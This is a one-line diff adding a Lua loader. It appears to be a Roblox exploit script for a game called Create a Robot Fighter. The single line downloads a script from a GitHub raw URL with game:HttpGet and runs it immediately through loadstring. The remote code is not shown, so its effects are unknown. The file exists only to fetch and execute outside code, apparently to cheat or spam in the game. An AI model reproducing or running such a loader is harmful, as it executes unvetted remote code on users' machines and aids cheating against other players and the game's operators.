@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/create-a-robot-fighter-spam7-os1r9020mdld9v.lua"))()
